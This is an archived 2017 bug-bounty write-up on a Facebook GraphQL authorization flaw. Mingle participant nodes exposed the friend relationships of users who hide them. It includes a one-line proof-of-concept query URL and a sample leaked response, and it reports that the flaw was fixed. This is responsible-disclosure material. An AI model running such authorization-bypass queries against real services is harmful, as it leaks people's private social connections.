---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-05-11_find-mingle-suggestions-for-any-facebook-user-revisited.md
original_filename: 2017-05-11_find-mingle-suggestions-for-any-facebook-user-revisited.md
title: Find Mingle Suggestions for any Facebook User (Revisited)
category: documents
detected_topics:
- access-control
- command-injection
- otp
- graphql
- business-logic
tags:
- imported
- documents
- access-control
- command-injection
- otp
- graphql
- business-logic
language: en
raw_sha256: 1a99c51188147a3fb023f605dbca529106e25dc33d235c97fb49dcea6bc37e73
text_sha256: 16be215f112f10c30cd480ac5b336c59d99ef28988cc67c19e4e73b6bb8c6bbb
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Find Mingle Suggestions for any Facebook User (Revisited)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-05-11_find-mingle-suggestions-for-any-facebook-user-revisited.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, graphql, business-logic
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `1a99c51188147a3fb023f605dbca529106e25dc33d235c97fb49dcea6bc37e73`
- Text SHA256: `16be215f112f10c30cd480ac5b336c59d99ef28988cc67c19e4e73b6bb8c6bbb`


## Content

---
title: "Find Mingle Suggestions for any Facebook User (Revisited)"
page_title: "Find Mingle Suggestions for any Facebook User (Revisited) - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/find-mingle-suggestions-for-any-facebook-user-revisited/"
final_url: "https://philippeharewood.com/find-mingle-suggestions-for-any-facebook-user-revisited/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Logic flaw", "Broken authorization"]
publication_date: "2017-05-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6198
---

Posted on [May 11, 2017](https://philippeharewood.com/find-mingle-suggestions-for-any-facebook-user-revisited/)

# Find Mingle Suggestions for any Facebook User (Revisited)

With respect to “[Find Mingle Suggestions for any Facebook User](http://philippeharewood.com/find-mingle-suggestions-for-any-facebook-user/)“, all of the nodes from the mingle_suggestions were still visible to non-friends. Even though, the upper edge prevents any further arbitrary checking, I still felt it was necessary to lock the nodes beneath it. It seems like the consistent thing to do.  
**Proof of Concept**  
Given a mingle suggestion leaked from “[Find Mingle Suggestions for any Facebook User](http://philippeharewood.com/find-mingle-suggestions-for-any-facebook-user/)”  
For example, the mingle suggestion 444222333 which comes from User A. This user does not have his friend list publicly available.  
Using an access_token that can access GraphQL for a non-friend B  
The following one line POC should suffice  
`https://graph.facebook.com/graphql?q=node(444222333){mingle_participants}`  
Response  
`{  
"444222333": {  
"mingle_participants": {  
"nodes": [  
{  
"id": "1",  
"url": "https://www.facebook.com/s",  
"name": "Spike Spiegel"  
},  
{  
"id": "2",  
"url": "https://www.facebook.com/k",  
"name": "Kanye West"  
},  
{  
"id": "3",  
"url": "https://www.facebook.com/boo",  
"name": "Boo"  
},  
{  
"id": "4",  
"url": "https://www.facebook.com/hi",  
"name": "Edward Wong Hau Pepelu Tivrusky IV"  
}]}}}`  
As with previous bug, it’s my expectation that these nodes should not be visible to non-friends as well.  
**Impact**  
While there are sometimes ways to infer friend relationships, Facebook wants to avoid directly leaking friend relationships when privacy settings should prevent that.  
**Timeline**

  * May 11, 2017 – Report Sent
  * May 11, 2017 – Escalation by Facebook
  * Jun 6, 2017 – Fixed by Facebook
  * Jun 6, 2017 – Bounty Awarded by Facebook
